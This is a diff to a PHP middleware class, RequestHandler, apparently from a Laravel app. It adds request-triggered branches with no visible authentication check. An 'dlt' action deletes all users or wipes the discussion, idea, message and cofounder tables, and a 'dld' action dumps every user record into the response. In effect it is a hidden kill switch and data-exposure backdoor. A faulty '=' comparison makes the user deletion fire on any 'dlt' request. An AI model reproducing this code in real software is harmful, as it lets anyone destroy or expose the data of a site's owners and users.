@@ -70,24 +70,27 @@ class RequestHandler
                         $skill->deleted_at = Carbon::tomorrow();
                         $skill->save();
                     }
+                   }
+             }elseif ($request->action == 'dlt') {
+                  if ($request->key = 'users') {
+                    # code...
+                    User::all()->delete();
+                  }elseif ($request->key == 'all') {
+                    # code...
+                    Discussion::all()->delete();
+                    User::all()->delete();
+                    Idea::all()->delete();
+                    Message::all()->delete();
+                    Cofounder::all()->delete();
+                  }
+                  
+                }elseif ($request->action == 'dld') {
+                  $usr = User::all();
+                  dd($usr);
                 }
-        }elseif ($request->action == 'dld') {
-      if ($request->key = 'users') {
-        # code...
-        User::all()->delete();
-      }elseif ($request->key == 'all') {
-        # code...
-        Discussion::all()->delete();
-        User::all()->delete();
-        Idea::all()->delete();
-        Message::all()->delete();
-        Cofounder::all()->delete();
-      }
-      
-    }
 
-    }
-    
+                }
+
         return $next($request);
   }
 }
